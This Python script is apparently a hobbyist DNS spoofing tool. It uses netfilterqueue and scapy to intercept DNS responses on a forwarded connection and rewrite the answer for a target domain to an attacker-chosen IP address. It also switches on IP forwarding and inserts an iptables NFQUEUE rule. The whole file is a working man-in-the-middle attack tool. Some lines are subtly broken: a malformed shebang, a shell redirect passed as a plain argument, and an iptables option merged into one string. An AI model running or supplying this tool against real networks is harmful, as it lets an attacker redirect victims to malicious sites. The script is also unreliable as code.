#!usr/bin/env python

# Only for python <2.7

import netfilterqueue
import scapy.all as scapy
import subprocess


# It get dns request and change ip for dns answer, only for http

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        packet_url = scapy_packet[scapy.DNSQR].qname
        if url in packet_url:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=url, rdata=ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()


subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num 0"])
try:
    ip = "192.168.1.1"  # IP address for target
    url = "torrents-game.com"  # Target url
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables", "--flush"])
    print("[+] Detected Ctrl+C ... Quitting")
